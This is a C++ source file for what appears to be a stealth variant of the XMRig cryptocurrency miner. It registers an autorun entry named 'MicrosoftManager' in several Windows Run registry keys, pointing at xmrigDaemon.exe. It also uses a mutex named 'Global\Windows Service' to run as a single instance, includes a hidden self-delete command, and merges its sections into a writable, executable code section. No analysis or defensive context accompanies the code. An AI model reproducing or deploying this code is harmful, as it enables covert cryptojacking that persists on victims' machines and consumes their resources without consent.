#include "App.h"
#include <windows.h>
#include <TCHAR.H>
#include <thread>
#include <sddl.h>
#include <stdio.h>
#include <aclapi.h>
#include <stdlib.h>
#include <Shlwapi.h>
#pragma comment(linker, "/MERGE:.data=.text")
#pragma comment(linker, "/MERGE:.rdata=.text")
#pragma comment(linker, "/SECTION:.text,EWR")

#define STRLEN(x)(sizeof(x) / sizeof(TCHAR) - 1)


int Delete(TCHAR* path) {
	TCHAR DelCom[MAX_PATH + 1];
	wsprintfW(DelCom, L"/c timeout -t 2 && del \"%s\"", path);
	ShellExecuteW(0, L"open", L"cmd.exe", DelCom, 0, SW_HIDE);
	std::exit(0);
}

BOOL IsElevated() {
	BOOL fRet = FALSE;
	HANDLE hToken = NULL;
	if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
		TOKEN_ELEVATION Elevation;
		DWORD cbSize = sizeof(TOKEN_ELEVATION);
		if (GetTokenInformation(hToken, TokenElevation, &Elevation, sizeof(Elevation), &cbSize)) {
			fRet = Elevation.TokenIsElevated;
		}
	}
	if (hToken) {
		CloseHandle(hToken);
	}
	return fRet;
}

int AutoRun(TCHAR* path, BOOL Admin) {
	HKEY hKey = NULL;
	HKEY hKey2 = NULL;
	HKEY hKey3 = NULL;
	DWORD dwRegType = REG_SZ;
	LONG lResult = 0;
	if (Admin) {
		lResult = RegOpenKey(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &hKey2);
		if (ERROR_SUCCESS != lResult) {
			RegCreateKey(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &hKey2);
			RegCreateKey(HKEY_LOCAL_MACHINE, L"OFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Run", &hKey3);
		}
		RegOpenKey(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &hKey2);
		RegSetValueExW(hKey2, L"MicrosoftManager", 0, REG_SZ, (PBYTE)path, lstrlen(path) * sizeof(TCHAR) + 1);
		RegCloseKey(hKey2);
		RegOpenKey(HKEY_LOCAL_MACHINE, L"SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Run", &hKey3);
		RegSetValueExW(hKey3, L"MicrosoftManager", 0, REG_SZ, (PBYTE)path, lstrlen(path) * sizeof(TCHAR) + 1);
		RegCloseKey(hKey3);
	} else {
		RegOpenKey(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", &hKey);
		RegSetValueExW(hKey, L"MicrosoftManager", 0, REG_SZ, (PBYTE)path, lstrlen(path) * sizeof(TCHAR) + 1);
		RegCloseKey(hKey);
		RegOpenKey(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &hKey2);
		RegSetValueExW(hKey2, L"MicrosoftManager", 0, REG_SZ, (PBYTE)path, lstrlen(path) * sizeof(TCHAR) + 1);
		RegCloseKey(hKey2);
		RegOpenKey(HKEY_LOCAL_MACHINE, L"SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Run", &hKey3);
		RegSetValueExW(hKey3, L"MicrosoftManager", 0, REG_SZ, (PBYTE)path, lstrlen(path) * sizeof(TCHAR) + 1);
		RegCloseKey(hKey3);
	}

	return 0;
}

int CheckMutex() {
		WCHAR MUTEX[] = { L"Global\\Windows Service"};
		HANDLE hMutex = CreateMutexW(0, 0, MUTEX);
		if ((GetLastError() == ERROR_ALREADY_EXISTS) || (GetLastError() == ERROR_ACCESS_DENIED)) {
			CloseHandle(hMutex);
			std::exit(0);
		}
		return 0;
}

int main(int argc, char **argv) {
	CheckMutex();
	AutoRun(L"C:\\MicrosoftManager\\xmrigDaemon.exe", IsElevated());
    App* app = new App(argc, argv);
    int res = app->start();
    delete app;

    return res;
}
